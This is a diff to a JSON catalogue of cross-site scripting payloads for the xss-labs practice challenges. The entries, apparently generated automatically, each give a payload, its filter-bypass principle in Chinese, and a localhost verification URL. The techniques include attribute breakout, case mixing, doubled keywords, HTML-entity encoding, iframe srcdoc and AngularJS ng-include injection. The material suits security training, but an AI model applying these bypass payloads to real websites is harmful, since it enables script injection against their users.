@@ -241,5 +241,165 @@
     "principle": "href 内 javascript: 协议的 script 关键字被替换破坏，用 HTML 十进制实体 &#115; 代表 s 拆开关键字（&#115;→s），绕过 str_replace；`&` `#` 需 URL 编码 %26 %23 才能到达服务端（# 否则被当 fragment）。点击链接触发。",
     "source": "xss-labs",
     "verify_url": "http://localhost:8080/level8.php?keyword=java%26%23115%3Bcript:alert(1)"
+  },
+  {
+    "id": "auto-20261018191907",
+    "context": "xss-labs level1：GET 参数 name 反射到 HTML 文本节点（欢迎用户xxx），无任何过滤/编码",
+    "reference_payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "principle": "HTML 文本上下文直接注入 script 标签，无过滤",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level1.php?name={payload}"
+  },
+  {
+    "id": "auto-20261018191931",
+    "context": "xss-labs level2：GET 参数 keyword 反射进 <input value=\"...\"> 双引号属性内，< > 未过滤，只编码了部分字符",
+    "reference_payload": "\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;",
+    "principle": "双引号属性闭合 breakout + 注入 script 标签",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level2.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261018191939",
+    "context": "xss-labs level3：GET 参数 keyword 反射进 <input value='...'> 单引号属性内，< > 被实体编码，单引号未转义",
+    "reference_payload": "' onmouseover='alert(1)",
+    "principle": "单引号属性 breakout 注入事件属性，绕开 <> 编码",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level3.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261018191945",
+    "context": "xss-labs level4：GET 参数 keyword 反射进 <input value=\"...\"> 双引号属性内，< > \" 都被编码/过滤，需要绕开引号直接用事件属性",
+    "reference_payload": "\" onmouseover=\"alert(1)",
+    "principle": "双引号属性内注入事件属性（无 <> 无闭合标签）",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level4.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261018191953",
+    "context": "xss-labs level5：GET 参数 keyword 先反射进 <input value=\"...\">，再进入 <a href=\"...\">；script 与 on 关键字被替换，< > 保留",
+    "reference_payload": "\"&gt;&lt;a href=\"javascript:alert(1)\"&gt;x&lt;/a&gt;",
+    "principle": "绕开 on*/script 关键字，用 javascript: 伪协议链接",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level5.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261018192032",
+    "context": "xss-labs level6：GET 参数 keyword 反射进 <input value=\"...\"> 与 <a href=\"...\">；关键字 on、script、href 被大小写敏感替换，< > \" 保留",
+    "reference_payload": "\"&gt;&lt;a hRef=\"javascript:alert(1)\"&gt;x&lt;/a&gt;",
+    "principle": "大小写混淆绕过大小写敏感的 str_replace（hRef）+ javascript: 伪协议",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level6.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261018192133",
+    "context": "xss-labs level7：GET 参数 keyword 反射进 <input value=\"...\"> 与 <a href=\"...\">，on 与 script 被替换为 o_n / scr_ipt 之后又被删除（双重过滤），< > \" 保留",
+    "reference_payload": "\" oonnclick=\"alert(1)",
+    "principle": "on 被替换+删除时用双写 oonn 重组出 on，配合 onclick 事件属性",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level7.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261018192408",
+    "context": "xss-labs level8：GET 参数 keyword 反射进 <a href=\"...\"> 双引号属性，输入先小写化并删除 on / script 关键字（多轮替换为 o_n、scr_ipt 再清除），< > \" 可用",
+    "reference_payload": "\" oonnclick=\"alert(1)",
+    "principle": "双写 oonn 重组被删除的 on 前缀，属性内注入 onclick（无需 javascript: 协议）",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level8.php?keyword={payload}"
+  },
+  {
+    "id": "auto-20261018194006",
+    "context": "HTML 文本节点直接反射，无任何过滤（level1）",
+    "reference_payload": "<script>alert(1)</script>",
+    "principle": "文本节点上下文，<script> 标签原样输出即执行",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level1.php?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+  },
+  {
+    "id": "auto-20261018194014",
+    "context": "输入反射进 <input value=\"...\"> 双引号属性内，htmlspecialchars 仅转义尖括号或转义 < > 但双引号可闭合（level2）",
+    "reference_payload": "\"><script>alert(1)</script>",
+    "principle": "双引号属性 breakout：先 \"> 闭合属性与标签，再注入 script",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level2.php?keyword=%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+  },
+  {
+    "id": "auto-20261018194021",
+    "context": "输入反射进单引号属性 value='...'，服务端 htmlspecialchars 默认 ENT_COMPAT 只转义双引号（level3）",
+    "reference_payload": "' onmouseover='alert(1)",
+    "principle": "单引号未转义 → 属性内注入事件处理器（无需闭合标签）",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level3.php?keyword=%27%20onmouseover%3D%27alert(1)"
+  },
+  {
+    "id": "auto-20261018194050",
+    "context": "反射进双引号属性 value=\"...\"，服务端过滤/删除尖括号 < > 但保留双引号，且页面内 window.alert 被重写为 confirm+跳转（level4）",
+    "reference_payload": "\" onfocus=\"confirm(1)\" autofocus=\"",
+    "principle": "无尖括号时代：用未转义的 \" 闭合属性注入 onfocus=autofocus，绕开被重写的 alert 改用 confirm",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level4.php?keyword=%22%20onfocus%3D%22confirm(1)%22%20autofocus%3D%22&r=9931"
+  },
+  {
+    "id": "auto-20261018194121",
+    "context": "反射进双引号属性 value=\"...\"，< > \" 均可用但服务端把 on 替换为 o_n（连带干掉 <script> 与 on* 事件），页面 window.alert 被重写（level5）",
+    "reference_payload": "\"><iframe srcdoc=\"&lt;script&gt;top['pr'+'ompt'](1)&lt;/script&gt;\">",
+    "principle": "on→o_n 替换时避开 event/script 关键字：用 iframe srcdoc + HTML 实体包裹 script，脚本侧用 top['pr'+'ompt'] 绕开被误伤的 confirm",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level5.php?keyword=%22%3E%3Ciframe%20srcdoc%3D%22%26lt%3Bscript%26gt%3Btop%255B%27pr%27%252B%27ompt%27%255D(1)%26lt%3B%2Fscript%26gt%3B%22%3E&r=5514"
+  },
+  {
+    "id": "auto-20261018194150",
+    "context": "反射进双引号属性，< > \" 均存活，服务端用大小写敏感的 str_replace 把 on 替换成 o_n（level6）",
+    "reference_payload": "\"><img src=x OnErRoR=\"top['pr'+'ompt'](1)\">",
+    "principle": "大小写敏感过滤绕过：事件名用 OnErRoR 大小写混淆；同时避免函数名里的 on（prompt→pr'+'ompt）",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level6.php?keyword=%22%3E%3Cimg%20src%3Dx%20OnErRoR%3D%22top%255B%27pr%27%252B%27ompt%27%255D(1)%22%3E&r=6651"
+  },
+  {
+    "id": "auto-20261018194231",
+    "context": "反射进双引号属性 value=\"...\"（单引号包裹的 href 场景同理），服务端把 on 替换为空/占位，需要双写重组（level7）",
+    "reference_payload": "\" oonnfocus=\"top['pr'+'ompt'](1)\" autofocus=\"",
+    "principle": "单次替换过滤用双写重组：oonnfocus→onfocus；且不要二次编码 [ ] + 等字符，否则服务端不二次解码导致 JS 语法错误",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level7.php?keyword=%22%20oonnfocus%3D%22top[%27pr%27%2B%27ompt%27](1)%22%20autofocus%3D%22&r=7751"
+  },
+  {
+    "id": "auto-20261018194330",
+    "context": "反射进 <a href=\"...\"> 友情链接，服务端对 script/src/on 做字符串替换（script→scr_ipt、src→sr_c、on→o_n），href 处 \"&gt; 可用但 value 处被实体编码（level8）",
+    "reference_payload": "java&#115;cript:top['pr'+'ompt'](1)",
+    "principle": "href 属性即 sink：用 HTML 数值实体 &#115; 代替 script 的 s，绕过关键词替换得到 javascript: 协议（点击触发）",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level8.php?keyword=java%26%23115%3Bcript%3Atop[%27pr%27%2B%27ompt%27](1)&r=8882"
+  },
+  {
+    "id": "auto-20261018194342",
+    "context": "反射进 <a href>，服务端先做合法性校验：值必须包含 http:// 否则整段替换为提示文本；同时仍对 script/on 等关键词替换（level9）",
+    "reference_payload": "java&#115;cript:top['pr'+'ompt'](1)//http://",
+    "principle": "http:// 白名单校验绕过：先写 javascript: 实体绕过关键词，再用 //http:// 作 JS 行注释满足校验条件",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level9.php?keyword=java%26%23115%3Bcript%3Atop[%27pr%27%2B%27ompt%27](1)%2F%2Fhttp%3A%2F%2F&r=9941"
+  },
+  {
+    "id": "auto-20261018194357",
+    "context": "hidden 输入框 value=\"...\" 反射，< > 被删除、双引号与 on 存活，type=hidden 使事件不触发（level10）",
+    "reference_payload": "\" type=\"text\" autofocus onfocus=\"top['pr'+'ompt'](1)\" x=\"",
+    "principle": "hidden 上下文先改写 type：用 \" 闭合后加 type=\"text\" autofocus onfocus=...，把隐藏元素变成可聚焦元素自动触发",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level10.php?t_sort=%22%20type%3D%22text%22%20autofocus%20onfocus%3D%22top[%27pr%27%2B%27ompt%27](1)%22%20x%3D%22&r=1031"
+  },
+  {
+    "id": "auto-20261018194606",
+    "context": "AngularJS 1.2.0 页面，输入被拼进 class=\"ng-include:{{src}}\"，ng-include 会把值当同源 URL 加载并编译（level15）",
+    "reference_payload": "'level1.php?name=<img src=x onerror=top[\"pr\"+\"ompt\"](1)>'",
+    "principle": "ng-include 同源页面注入：用引号让 src 变成字符串 URL，指向未过滤的 level1.php?name=<img onerror>，被 include 后解析执行",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level15.php?src=%27level1.php%3Fname%3D%253Cimg%2520src%253Dx%2520onerror%253Dtop%255B%2522pr%2522%252B%2522ompt%2522%255D(1)%253E%27&r=1562"
+  },
+  {
+    "id": "auto-20261018194621",
+    "context": "HTML 文本节点直出，服务端把空格替换成 &nbsp; 并把 script 关键字置空（level16）",
+    "reference_payload": "<img\\nsrc=x\\nonerror=top[\"pr\"+\"ompt\"](1)>",
+    "principle": "空格被替换为 &nbsp;（非法属性分隔符）时改用换行 %0A/制表符 %09 分隔属性；用 onerror 事件绕开 script 关键字",
+    "source": "xss-labs",
+    "verify_url": "http://localhost:8080/level16.php?keyword=%3Cimg%0Asrc%3Dx%0Aonerror%3Dtop%5B%22pr%22%2B%22ompt%22%5D(1)%3E&r=1621"
   }
 ]
